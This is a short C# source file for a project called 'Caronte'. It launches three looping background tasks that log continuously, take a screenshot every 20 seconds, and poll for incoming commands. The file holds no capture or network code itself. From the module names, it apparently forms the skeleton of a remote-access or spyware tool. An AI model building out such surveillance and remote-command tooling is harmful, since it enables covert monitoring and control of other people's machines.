using Caronte.Modules.Logger;
using Caronte.Modules.PrintScreen;
using Caronte.Modules.ReceiveCommand;
using MediatR;
using System;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte
{
    public static class InitializeModules
    {
        private static IMediator _mediator;
        private static CancellationToken _cancellationToken;  
        public static async Task Initialize(IMediator mediator, CancellationToken cancellationToken)
        {
            _mediator = mediator;
            _cancellationToken = cancellationToken;

            var logTask = InitializeLogTask();
            var printScreenTask = InitializePrintScreenTask();
            var receiveCommandTask = InitializeReceiveCommandTask();


            await Task.WhenAll(logTask, printScreenTask, receiveCommandTask);
        }

        private static Task InitializeLogTask()
        {
            var logTask = Task.Run(async () =>
            {
                while (!_cancellationToken.IsCancellationRequested)
                {
                    await _mediator.Send(new LogQuery());
                }
            }, _cancellationToken);

            return logTask;
        }

        private static Task InitializePrintScreenTask()
        {
            var printScreenTask = Task.Run(async () =>
            {
                while (!_cancellationToken.IsCancellationRequested)
                {
                    await _mediator.Send(new PrintScreenQuery());
                    await Task.Delay(TimeSpan.FromSeconds(20), _cancellationToken);
                }
            }, _cancellationToken);

            return printScreenTask;
        }

        private static Task InitializeReceiveCommandTask()
        {
            var receiveCommandTask = Task.Run(async () =>
            {
                while (!_cancellationToken.IsCancellationRequested)
                {
                    await _mediator.Send(new ReceiveCommandQuery());
                }
            }, _cancellationToken);

            return receiveCommandTask;
        }
    }
}
